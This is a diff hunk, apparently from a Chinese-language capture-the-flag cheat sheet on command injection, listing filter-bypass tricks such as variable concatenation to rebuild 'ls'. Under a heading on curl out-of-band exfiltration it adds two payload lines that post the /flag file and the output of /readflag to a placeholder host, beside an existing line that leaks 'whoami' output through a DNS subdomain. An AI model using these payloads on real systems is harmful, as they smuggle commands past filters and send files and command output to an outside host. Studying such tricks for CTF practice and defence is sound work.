@@ -590,8 +590,10 @@ hex
 %0d
 #局部变量
 a=l;b=s;$a$b
-#curl 外带
+#curl外带
 curl `whoami`.xxx.com
+curl http://xxx.com -d@/flag
+curl http://xxx.com --post-data $(/readflag)
 
 ```
 - 使用`\`换行符
